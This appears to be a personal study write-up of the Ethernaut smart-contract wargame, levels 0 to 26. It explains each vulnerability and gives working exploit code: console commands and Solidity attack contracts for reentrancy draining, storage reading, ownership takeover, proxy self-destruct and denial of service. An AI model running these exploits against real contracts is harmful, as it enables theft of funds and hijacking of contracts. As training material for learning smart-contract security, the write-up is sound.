# Ethernaut

## Helpers

- [Ethernaut Hacks](https://dev.to/nvn/ethernaut-hacks-level-0-hello-ethernaut-1fde)

- [Ethernaut CTF](https://www.youtube.com/watch?v=MaGAVBRwvbg&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)

- [Ethernaut - YouTube](https://www.youtube.com/watch?v=kZb6Qjlgybo&list=PLBy3Qkuapv_7R1ZI_Cs2NOFn7ZTaNWY6G)

- [Ethernaut puzzles solved with foundry](https://github.com/ciaranmcveigh5/ethernaut-x-foundry)

- [In-depth Ethernaut walkthrough](https://0xsage.medium.com/)

## 0. Hello Ethernaut

The goal here is to make an introduction to the Ethernaut. Web3.js is already injected in the browser console. Sometime, Remix is going to be needed.

Important to pay attention on the smart contract functions flow: it may have a vulnerability.

Solution (browser console):

```javascript
await contract.info()
await contract.info1()
await contract.info2("hello")
(await contract.infoNum()).toString()
await contract.info42()
await contract.theMethodName()
await contract.method7123949()
await contract.password()
await contract.authenticate('ethernaut0')
```

## 1. Fallback

Fallback function is executed when the called function does not exist and for receiving ETH. There is also the receive function for that. The receive function is executed when there is no data sent with the transaction.

![](C:\Users\eduar\Documents\Cursos\Python\DataFlair\Material\2022-07-27-15-08-59-image.png)

Therefore, one needs to be very careful when using fallback and receive functions.

Solution (browser console):

```javascript
await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
(await contract.getContribution()).toString()
await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
await contract.owner()
await contract.withdraw()
```

## 2. Fallout (constructor)

In older versions of Solidity, the constructor was a normal function with the same name as the smart contract. So, if there was any difference in the name of the constructor function and the contract name, the constructor would actually be a normal callable function. In this case, the contract name is `Fallout` and what it was supposed to be the constructor was named as `Fal1out`.

I the newest Solidity version, theres is the `constructor` keyword to avoid this error.

Solution (browser console):

```javascript
await contract.Fal1out()
await contract.owner() === player
```

**Important hack:** Rubixi hack

Dynamic Pyramid changed its name to Rubixi and forgot to change the constructor name:

```solidity
contract Rubixi {
    address private owner;
    function DynamicPyramid() {owner = msg.sender;}
    function collectAllFees() {owner.send(collectedFess);}
    ...
}
```

## 3. Coin Flip (randomness in smart contract)

Generating random numbers in the somart contract is not easy. Actually, it is not possible to generate a random number in the smart contract without being vulnerable of third party actions. Unless a decentralized and deterministic random verifiable generator service is used, such as [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number/). Other options are: [BTC Relay](http://btcrelay.org/), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/).

The smart contract of this challange uses `block` properties to generate the random number. With that, a third party can easily determine the result.

Solution (Remix) - call `coinFlipGuess()` 10 times:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function coinFlipGuess(address _coinFlipAddr) external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }

        return consecutiveWins;
    }
}
```

Then, check how many consecutive wins (browser console): 

```javascript
(await contract.consecutiveWins()).toString()
```

## 4. Telephone (tx.origin)

The `tx.origin` property returns the address of the caller entity (smart contract or wallet) at the very beginning of the process, whilst `msg.sender` returns the address of the last caller of the function.

![](C:\Users\eduar\Documents\Cursos\Python\DataFlair\Material\2022-07-27-16-32-40-image.png)

Solution (Remix):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract IntermediateContract {
  function changeOwner(address _addr) public {
    ITelephone(_addr).changeOwner(msg.sender);
  }
}
```

[Ethereum Foundation report](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

## 5. Token (integer overflow and underflow)

Integer overflow and underflow occur when a value of a variable exceeds its type range. For example, a `uint8` has a range from 0 to 255. In older Solidity versions, if `uint8 a = 255` and 1 is added to it, the new value of a would be 0. However, in the newest version of Solidity, when encountering overflow or underflow, the transcation will revert.

Solution (browser console):

```javascript
await contract.transfer('0x0000000000000000000000000000000000000000', 21)
(await contract.balanceOf(player)).toString()
```

## 6. Delegation (delegatecall function)

The `delegatecall()` function calls functions from other smart contracts, but the state variables from the caller contract are changed, not the calling contract. In other words, if a `delegatecall()` is executed from contract A to contract B, the code of contract B is executed, but the state variables of contract A are changed. See [this Solidity docs](https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries) for more clarification.

![](C:\Users\eduar\Documents\Cursos\Python\DataFlair\Material\2022-07-27-20-55-37-image.png)

Solution (browser console):

```javascript
const signature = web3.utils.keccak256("pwn()")
await contract.sendTransaction({data: signature})
await contract.owner()
```

**Import hack:** [The Parity Wallet Hack](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7)

## 7. Force (selfdestruct function)

In order to a smart contract receive Ether, it needs a `fallback()` or `receive()` functions, or even a `payable` function.

The `selfdestruct()` function needs payable address as parameter in order to send the remainder WEI to another address, smart contract or wallet.

In the case of smart contracts, even though the contract does not have a `fallback()`, or `receive()` or a `payable` function, the contract will accept the transfer. In other words, a smart contract cannot reject Ether coming from a `selfdestruct()` function.

Solution (Remix):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Selfdestruct {
    address payable goal;

    constructor(address payable _goal) public payable {
        goal = _goal;
    }

    function attack() public {
        selfdestruct(goal);
    }
}
```

## 8. Vault (private - not really - state variables)

On the blockchain, private state variables are not really private. You can't get their values by calling their name with a package like ethers.js or web3.js. However, if you know the contract address and the storage slot of the variable that you want to read, then you can access its value. 

The `private` keyword limits access in the context of smart contracts. It does not limit access on the blockchain itself.

A good remainder is that **nothing on the blockchain is confidential**!

Solution (browser console):

```javascript
const password = await web3.eth.getStorageAt(contract.address, 1)
web3.utils.toAscii(password) // to see what the password really is
await contract.unlock(password)
await contract.locked()
```

[zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

## 9. King (transfer function)

There are 3 ways for sending ETH:

1. `address_to.transfer(_value)`: uses 2300 gas and reverts if the transfer is not successfull;

2. `address_to.call{value: _value}("")`: uses all gas and returns a boolean (`true`: success, `false`: fail) and data in `bytes`;

3. `address_to.send(_value)`: uses 2300 gas and returns a boolean (`true`: success, `false`: fail).

Since the smart contract to be hacked uses the `transfer()` function, if a smart contract that does not have a `fallback()` or `receive()` functions implemented, the `trasfer()` funcion line will fail and the function call will be reverted.

Solution (Remix):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract BeKing {   
    function attack(address payable _to) public payable {
        (bool sent,) = _to.call{value: msg.value}("");
        require(sent, "Transaction failed");
    }
}
```

See: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).

## 10. Re-entrancy

Re-entrancy attack can happen when a `address.call()` function is calling to a malicious smart contract and the state variables are update only after the call.

![](C:\Users\eduar\Documents\Cursos\Python\DataFlair\Material\2022-07-28-22-53-24-image.png)

There are 2 main ways to prevente re-entrancy attacks:

1. [Checks-Effects-Interactions pattern](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern)

2. [mutex](https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21)

Some other solutions are:

1. [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard)

2. [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment)

Questions asked:

- [Is there a limit for executing address.call() in Solidity? If the ETH value to be sent is greater than the contract balance, will it fail? - Stack Overflow](https://stackoverflow.com/questions/73160698/is-there-a-limit-for-executing-address-call-in-solidity-if-the-eth-value-to-b)

`transfer` and `send ` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork ([source](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742)). However, other people suggest to use `send` or `transfer` instead of `call`, to limit the security risk ([source](https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21)).

**Main hack:** [the DAO hack](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao#section-what-is-a-dao)

Solution (Remix - V1):

```solidity
interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract Reentrancy {   

    IReentrance public contractToAttack;
    address public owner;
    uint public amount;

    constructor(address _contract_address) public {
        contractToAttack = IReentrance(_contract_address);
        owner = msg.sender;
    }

    function donate() public payable {
        contractToAttack.donate{value: msg.value}(address(this));
        amount = msg.value;
    }   

    function withdraw() public {
        require(owner == msg.sender, "Only owner");
        msg.sender.transfer(address(this).balance);
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

    receive() external payable {
        if (address(contractToAttack).balance > 0){            
            contractToAttack.withdraw(amount);
        }    
    } 
}
```

Solution (Remix - V2):

```solidity
contract ReentrancyV2 {   

    address public contractToAttack;
    address public owner;
    uint public amount;

    constructor(address _contract_address) public {
        contractToAttack = _contract_address;
        owner = msg.sender;
    }

    function donate() public payable {
        bytes memory data = abi.encodeWithSignature("donate(address)", address(this));
        (bool sent,) = contractToAttack.call{value: msg.value}(data);
        require(sent, "Donation failed");
        amount = msg.value;
    }   

    function withdraw() public {
        require(owner == msg.sender, "Only owner");
        msg.sender.transfer(address(this).balance);
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

    fallback() external payable {
        if (address(contractToAttack).balance > 0){            
            bytes memory data = abi.encodeWithSignature("withdraw(uint256)", amount);
            (bool sent,) = contractToAttack.call(data);
            require(sent, "Attack failed");
        }    
    } 
}
```

## 11. Elevator (importance of state modifiers)

The interface implemented for the Elevator smart contract does not specify any state modifier, which means it allows to modify state variables. If there was a `view` or `pure` as a state modifier in the interface, the attack wouldn't be possible.

To understand more about specifiers and state modifiers, check [this](https://docs.soliditylang.org/en/develop/contracts.html#view-functions) and [this](https://docs.soliditylang.org/en/v0.8.15/cheatsheet.html?highlight=specifier#modifiers) Solidity documentations.

Solution (Remix):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract ElevatorAttack is Building {

    bool public toggle = true;
    address public elevator;

    constructor(address _elevator) public {
        elevator = _elevator;
    }

    function isLastFloor(uint) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    } 

    function callGoTo(uint _floor) public {
        bytes memory data = abi.encodeWithSignature("goTo(uint256)", _floor);
        (bool sent,) = elevator.call(data);
        require(sent, "Transaction failed");        
    }
}
```

## 12. Privacy (storage layout)

Again, everything in Ethereum blockcahin is public, nothig is confidential.

Two main things to learn:

1. How to access data in storage slots:
   
   - [Solidity variables — storage, type conversions and accessing private variables](https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183)
   
   - [Solidity Storage Variables with Ethers.js](https://betterprogramming.pub/solidity-storage-variables-with-ethers-js-ca3c7e2c2a64)
   
   - [All About Solidity Data Locations — Storage](https://betterprogramming.pub/all-about-solidity-data-locations-part-i-storage-e50604bfc1ad)
   
   - [Collisions of Solidity Storage Layouts](https://mixbytes.io/blog/collisions-solidity-storage-layouts)
   
   - [Solidity Storage in-depth](https://kubertu.com/blog/solidity-storage-in-depth/)
   
   - [Solidity Storage Layout For Proxy Contracts and Diamonds](https://medium.com/1milliondevs/solidity-storage-layout-for-proxy-contracts-and-diamonds-c4f009b6903)
   
   - [How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925) - recommended by Ethernaut
   
   - [Layout of State Variables in Storage - Solidity docs](https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html)

2. How to convert types in Solidity:
   
   - [Solidity variables — storage, type conversions and accessing private variables](https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183)
   
   - [Solidity Tutorial: All About Types Conversion](https://betterprogramming.pub/solidity-tutorial-all-about-conversion-661130eb8bec)
   
   - Book - Solidity Programming Essentials

Solution (browser console):

```javascript
const data3 = await web3.eth.getStorageAt(contract.address, 5)
const key = data3.slice(0, 34)
await contract.unlock(key)
await contract.locked()
```

## 13. Gatekeeper 1 (gasleft() and bytes operations)

The key to enter is based on the value of `tx.origin`, i.e., the address of the original sender of the transaction. Furthermore, it is totally based on explicit convertions between types (more especifically, `uint` and `bytes8`).

More about `gasleft()` Solidity function [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls).

Good sources:

- [The ultimate guide to data types in Solidity](https://blog.logrocket.com/ultimate-guide-data-types-solidity/)

- [Solidity Tutorial: All About Types Conversion](https://betterprogramming.pub/solidity-tutorial-all-about-conversion-661130eb8bec)

- [Solidity Tutorial : all about Bytes](https://jeancvllr.medium.com/solidity-tutorial-all-about-bytes-9d88fdb22676)

- [Bytes in Solidity](https://www.thecrosschain.co/post/bytes-in-solidity)

- [Solidity Tutorial : all about Addresses](https://jeancvllr.medium.com/solidity-tutorial-all-about-addresses-ffcdf7efc4e7)

The solution walkthrough can be seen [here](https://dev.to/nvn/ethernaut-hacks-level-13-gatekeeper-one-3ljo).

Solution (Remix):

```solidity
contract PassGateOne {

    address public gateKeeper;

    constructor(address _gateKeeper) public {
        gateKeeper = _gateKeeper;
    }

    function passGate(uint256 _mult) public {     
        bytes8 gateKey = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;

        uint _gas = (8191 * _mult) + 254; // 254 gas usage until calling gasleft() function in the second modifier gateTwo
        for (uint ii = _gas - 100; ii < _gas + 100; ii++) {
            (bool sent,) = gateKeeper.call{gas: ii}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(sent) {
                break;
            }
        }
    }
}
```

## 14. Gatekeeper 2 (assembly)

To pass this level, it is necessary to understand the `assembly`, `extcodesize()`.

Check more about assembly [here](https://docs.soliditylang.org/en/v0.4.23/assembly.html).

The `extcodesize()` assembly function returns 0 during initialization code execution (see section 7 of [Ethereum yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf)).

Check about operators [here](https://docs.soliditylang.org/en/v0.4.23/miscellaneous.html#cheatsheet).

Solution (Remix):

```solidity
interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract PassGateTwo {

    constructor(address _contract) public {
        bytes8 _gateKey = bytes8(
            uint64(
                bytes8(
                    keccak256(
                        abi.encodePacked(address(this))
                        ))) ^ uint64(0) - 1);
        // bytes memory data = abi.encodeWithSignature(
        //         "enter(bytes8)",
        //         _gateKey
        //      );
        // (bool sent,) = _contract.call(data);       

        IGatekeeperTwo gateKeeper = IGatekeeperTwo(_contract);
        gateKeeper.enter(_gateKey);
    }    
}
```

## 15. Naught Coin (ERC20 token allowance and transfer)

For this level, it is important to understand how the ERC20 transfer functions and allowance work. See more details [here](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) and [here](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts).

**Solution**:

Contract (Remix):

```solidity
contract Receiver {

    address public _contract;

    constructor(address _Contract) {
        _contract = _Contract;
    }

    function transferToken(uint _amount) public {
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", 
            msg.sender, 
            address(this), 
            _amount
            );
        (bool sent,) = _contract.call(data);
        require(sent, "Error");
    }
}
```

Deploy this contract with the instance address.

Then, get the token supply and approve transactions for the address (browser console):

```javascript
const totalAmount = await contract.INITIAL_SUPPLY()
await contract.approve(
    "0xd529065a2413CAA6244815baBCdE6C7279E997Cd", // Receiver contract address
    totalAmount
)
```

Then, call the `transferToken()` function from the Receiver contract with the `totalAmount` value as parameter.

## 16. Preservation (Storage layout - redirecting to another contract)

For this level, it is necessary to change the address of the library contract to point to another contract that will change the `owner` address.

Solution (Remix):

```solidity
interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract becomeOwner {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    IPreservation public preservation;         

    constructor(address _contract) public {
        preservation = IPreservation(_contract);
        owner = msg.sender;
    }

    function setOwner() public {
        require(owner == msg.sender, "only owner");

        // Changing timeZone1Library to address of this contract
        preservation.setFirstTime(uint256(address(this)));

        // Taking ownership of Preservation contract
        preservation.setFirstTime(uint256(msg.sender));
    }

    function setTime(uint _newOwner) public {
        owner = address(_newOwner);
    }
}
```

## 17. Recovery (Etherscan)

For this level, check the contract address on Etherscan and look for the transaction hash of deployment. Then, do the solution steps.

Solution (browser console):

```javascript
const functionSignature = {
    name: "destroy",
    type: "function",
    inputs: [
        {
            type: "address",
            name: "_to"
        }
    ]
}

const encodedFunctionCall = web3.eth.abi
    .encodeFunctionCall(functionSignature ,[player])
await web3.eth.sendTransaction(
    {
        from: player, 
        to: "0x5948f4DE440D8bd9D928a2982D56F7036C582F4c", // SimpleToken contract address
        data: encodedFunctionCall
    }
)
```

## 18. MagicNumber (opcode and bytecode)

For this level, it is important to understand how opcode works and how bytecode is generated.

Use the following sources:

- Solidity [bytecode and opcode](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2) basics

- [Destructuring Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/) series

- EVM opcodes [reference](https://ethereum.org/en/developers/docs/evm/opcodes)

- [Bytecode diagram](https://gists.rawgit.com/ajsantander/23c032ec7a722890feed94d93dff574a/raw/a453b28077e9669d5b51f2dc6d93b539a76834b8/BasicToken.svg)

- [Ethereum opcodes and instruction reference](https://github.com/crytic/evm-opcodes)

- [Stack machine - Wikipedia](https://en.wikipedia.org/wiki/Stack_machine#Design)

To help with the solution:

- [Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)

- [Ethernaut Level 18](https://listed.to/@r1oga/13786/ethernaut-levels-16-to-18#MagicNumber)

The runtime opcode is:

| Opcode/Hex value | Name/Value | Obs                            |
| ---------------- | ---------- | ------------------------------ |
| 0x60             | PUSH1      |                                |
| 0x2a             | 42         | Value to be returned           |
| 0x60             | PUSH1      |                                |
| 0x40             | 0x40       | Arbitrary memory location      |
| 0x52             | MSTORE     |                                |
| 0x60             | PUSH1      |                                |
| 0x20             | 32         | Size of stored data (32 bytes) |
| 0x60             | PUSH1      |                                |
| 0x40             | 0x40       | Memory location (slot)         |
| 0xf3             | RETURN     |                                |

Therefore, the runtime bytecode is: `0x602a60405260206040f3`

The initialization upcode is:

| Opcode/Hex value | Name/Value | Obs                                                                                    |
| ---------------- | ---------- | -------------------------------------------------------------------------------------- |
| 0x60             | PUSH1      |                                                                                        |
| 0x0a             | 10         | Size of the runtime conde (10 bytes)                                                   |
| 0x60             | PUSH1      |                                                                                        |
| 0x0c             | 12         | Current position of runtime opcode (since the initialization code is 12 bytes in size) |
| 0x60             | PUSH1      |                                                                                        |
| 0x00             | 0x00       | Arbitrary memory destination position of the code                                      |
| 0x39             | CODECOPY   |                                                                                        |
| 0x60             | PUSH1      |                                                                                        |
| 0x0a             | 10         | Size of the runtime conde (10 bytes)                                                   |
| 0x60             | PUSH1      |                                                                                        |
| 0x00             | 0x00       | Arbitrary memory destination position of the code                                      |
| 0xf3             | RETURN     |                                                                                        |

Therefore, the initialization bytecode is: `0x600a600c600039600a6000f3`

Solution (browser console):

```javascript
const initializationBytecode = "600a600c600039600a6000f3"
const runtimeBytecode = "602a60405260206040f3"
const tx = await web3.eth.sendTransaction(
    {
        from: player, 
        data: "0x" + initializationBytecode + runtimeBytecode
    }
)
await contract.setSolver(tx.contractAddress)
```

## 19. Alien Codex (dynamic-sized array storage layout)

Good resources:

- Contract [storage mechanism](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) for dynamically sized arrays
- [Storage slot assignment in contract on inheritance](https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there)
- Integer [overflow/underflow](https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows) in Solidity

Since there are $2^{256} - 1$ memory slots, it is possible to take advantage of `uint` underflow to access the $2^{256}$ slot which is the same as the 0 slot (the same slot of the `owner` variable).

The memory slot asignment for dynamic-sized arrays is given by:

$$
keccak256(Length_{array}) + Index \times Size_{element}
$$

Therefore, to access the `owner` slot using the `codex` array, the index should be (size of the element is 32 bytes, that means, 1 slot):

$$
Index = 2^{256} - p
$$

where $p = keccak256(Length_{array})$.

Solution (browser console):

```javascript
await contract.make_contact()
await contract.retract()
const encodedAddress = web3.eth.abi.encodeParameter("address", player)
const slot = web3.eth.abi.encodeParameter("uint256",1)
const p = web3.utils.keccak256(slot)
const value = web3.utils.toBN(2).pow(web3.utils.toBN(256))
const addressSlot = value.sub(web3.utils.toBN(p))
await contract.revise(addressSlot, encodedAddress)
```

## 20. Denial (Denial of Service - DoS)

For a denial of service to happen in the blockchain, all the gas must be consumed in the malicious contract.

Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

*Note*: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.

Solution (Remix):

```solidity
contract DoS {
    fallback() external payable {
        uint n;
        while(gasleft() > 0) {
            n++;
        }
    }
}
```

After deploying the DoS contract, copy its address and then, in the browser console:

```javascript
await contract.setWithdrawPartner("contract address")
```

## 21. Shop (external and untrusted contracts logic)

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.

Solution (Remix):

```solidity
interface Buyer {
  function price() external view returns (uint);
}

interface Shop {
    function isSold() external view returns(bool);

    function buy() external;
}

contract BBuyer is Buyer {

    Shop shop;

    constructor(address _shop) public {
        shop = Shop(_shop);
    }

    function price() external override view returns(uint) {
        bool isSold = shop.isSold();
        if(!isSold) {
            return 100;
        }
        return 0;
    }

    function buy() public {
        shop.buy();
    }
}
```

## 22. DEX (token price calculation)

The vulnerability is in `getSwapPrice()` function. First, swap all token1 for token2, then all token2 for token1, ans so on. The vulnerability is on the `uint` division (Solidity [division operation](https://docs.soliditylang.org/en/v0.8.11/types.html#division)).

| Step | DEX - token1 | DEX - token2 | Player - token1 | Player - token2 |
| ---- | ------------ | ------------ | --------------- | --------------- |
| 0    | 100          | 100          | 10              | 10              |
| 1    | 110          | 90           | 0               | 20              |
| 2    | 86           | 110          | 24              | 0               |
| 3    | 110          | 80           | 0               | 30              |
| 4    | 69           | 110          | 41              | 0               |
| 5    | 110          | 45           | 0               | 65              |
| 6    | 0            | 90           | 110             | 20              |

Solution (browser console):

```javascript
await contract.approve(contract.address, 200)
const token1Address = await contract.token1()
const token2Address = await contract.token2()

await contract.swap(token1Address, token2Address, 
    (await contract.balanceOf(token1Address, player)))
await contract.swap(token2Address, token1Address, 
    (await contract.balanceOf(token2Address, player)))
await contract.swap(token1Address, token2Address, 
    (await contract.balanceOf(token1Address, player)))
await contract.swap(token2Address, token1Address, 
    (await contract.balanceOf(token2Address, player)))
await contract.swap(token1Address, token2Address, 
    (await contract.balanceOf(token1Address, player)))
await contract.swap(token2Address, token1Address, 45)

(await contract.balanceOf(token1Address, contract.address)).toString()
```

## 23. DEX 2 (token price calculation)

Since the smart contract is not checking which token is beeing swapped, it is possible to create a fake (dummy) token to swap for all the tokens of this DEX contract.

Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trust worthy.

Good resources:

- [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).

Solution part 1 (Remix):

```solidity
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/ERC20.sol";

contract DummyToken is ERC20 {
    constructor(address _dex) public ERC20("DUMMY", "DUM") {
        _mint(_dex, 1000);
        _mint(msg.sender, 2000);
        _approve(msg.sender, _dex, 2000);
    }

    function mint(uint _amount) public {
        _mint(msg.sender, _amount);
    }
}
```

Solution part 2 (browser console):

```javascript
const dummyTokenAddress = "dummy token contract address"
const token1Address = await contract.token1()
const token2Address = await contract.token2()
await contract.approve(contract.address, 200)
await contract.swap(dummyTokenAddress, token1Address, 1000)
await contract.swap(dummyTokenAddress, token2Address, 2000)
```

## 24. Puzzle Wallet (proxy patterns and upgradeable contracts)

Good resources:

- [Proxy Patterns](https://blog.openzeppelin.com/proxy-patterns/)

- [Ethernaut Puzzlewallet - YouTube](https://www.youtube.com/watch?v=3JcS-04cAj0)

- [The Ethernaut writeups: 24 - Puzzle Wallet](https://www-kiendt-me.translate.goog/2022/03/01/the-ethernaut-24/?_x_tr_sl=vi&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc)

- [DelegateCall: Calling Another Contract Function in Solidity](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)

- [Contract upgrade anti-patterns](https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/)

- [Proxies - OpenZeppelin Docs](https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Proxy-constructor-address-bytes-)

- [Accessing Private Data YouTube](https://www.youtube.com/watch?v=Gg6nt3YW74o)

- [Understanding Ethereum Smart Contract Storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)

- [Proxy Upgrade Pattern - OpenZeppelin Docs (proxy forwarding)](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies#proxy-forwarding)

Questions asked:

- [Ethernaut level 24 - Puzzle Wallet: to which contract the wallet object on the browser console refers to? - Stack Overflow](https://stackoverflow.com/questions/73249245/ethernaut-level-24-puzzle-wallet-to-which-contract-the-wallet-object-on-the-b)

- [Ethernaut CTF - Puzzle Wallet (Level 24) - YouTube](https://www.youtube.com/watch?v=toVc-iX-XAA)

Solution (browser console):

```javascript
const functionSignature =  {
    name: "proposeNewAdmin", 
    type:"function", 
    inputs: [
        { 
            name:"_newAdmin",
            type:"address"
        }
    ]
} 
const data = web3.eth.abi.encodeFunctionCall(functionSignature, [player])
await web3.eth.sendTransaction(
    {
        from: player, 
        to: contract.address, 
        data: data
    }
)
await contract.addToWhitelist(player)
const depositData = await contract.methods["deposit()"].request()
const multicallData = await contract.methods["multicall(bytes[])"]
                                .request([depositData.data])
await contract.multicall(
    [multicallData.data, multicallData.data], 
    {value: web3.utils.toWei('0.001')}
)
await contract.execute(player, web3.utils.toWei('0.002'), 0x0)
await contract.setMaxBalance(player)
```

## 25. Motorbike (proxy contracts)

Solution (browser console):

```javascript
const EngineAddress = "0x" + 
    (await web3.eth.getStorageAt(
        contract.address, 
        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    )
).slice(26)
const encodedFunctionCall = web3.eth.abi.encodeFunctionSignature("initialize()")
await web3.eth.sendTransaction(
    {
        from: player, 
        to: EngineAddress,
        data: encodedFunctionCall
    }
)

// after coding and deploying the BombEngine smart contract

const bombEngineAddress = "BombEngine address"
const functionCall = web3.eth.abi.encodeFunctionSignature("explode()")
const functionSign = {
    name:"upgradeToAndCall",
    type:"function",
    inputs: [
        {
            name: "newImplementation", 
            type:"address"
        },
        {
            name: "data",
            type: "bytes"
        }
    ]
}
const encodedFunctionCall = web3.eth.abi.encodeFunctionCall(
                                functionSign, 
                                [bombEngineAddress, functionCall]
                            )
await web3.eth.sendTransaction({
                from: player, 
                to: EngineAddress,
                data: encodedFunctionCall
            }
)
```

Solution (Remix):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract BombEngine {
    function explode() external {
        selfdestruct(address(0));
    }
}
```

## 26. DoubleEntryPoint (Forta detection bot)

Solution (browser console):

```javascript
// THIS IS ACTUALLY NOT PART OF THE SOLUTION, BUT A DEMONSTRATION
// OF WHAT SHOULD NOT HAPPEN
// ---------------------------------------------------------------
const vault = await contract.cryptoVault()
const legacyToken = await contract.delegatedFrom()
const sweepSig = web3.eth.abi.encodeFunctionCall({
    name: 'sweepToken',
    type: 'function',
    inputs: [{name: 'token', type: 'address'}]
}, [legacyToken])
await web3.eth.sendTransaction({from:player, to: vault, data: sweepSig})
(await contract.balanceOf(vault)).toString() // should be 0
// ---------------------------------------------------------------

// After coding and deploying the Forta contract, it is time to set the
// bot

const botAddr = "FortaDetectionBot address"
const forta = await contract.forta()
const setBotSig = web3.eth.abi.encodeFunctionCall({
    name: 'setDetectionBot',
    type: 'function',
    inputs: [
        { type: 'address', name: 'detectionBotAddress' }
    ]
}, [botAddr])
await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig})
```

Solution (Remix):

```solidity
pragma solidity ^0.8.0;

interface IForta {
    function raiseAlert(address user) external;
